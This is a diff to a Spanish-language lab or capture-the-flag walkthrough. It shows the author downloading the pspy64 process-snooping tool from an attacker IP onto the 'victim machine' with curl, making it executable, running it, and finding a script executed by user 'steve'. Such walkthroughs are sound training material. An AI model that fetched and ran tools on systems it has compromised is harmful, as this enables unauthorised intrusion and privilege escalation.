@@ -172,9 +172,17 @@ Y en la maquina victima lo descargamos en `/tml`
 curl -O http://10.10.15.158/pspy64
 ```
 
-Le damos permisos de ejecucion
+Le damos permisos de ejecución
 ```shell
 chmod +x pspy64
 ```
 
 Y lo ejecutamos
+```shell
+./pspy64 -pf -i 1000
+```
+
+Encontramos un proceso corriendo bajo el usuario `steve`
+```shell
+/home/steve/bin/process_client_submissions.sh
+```
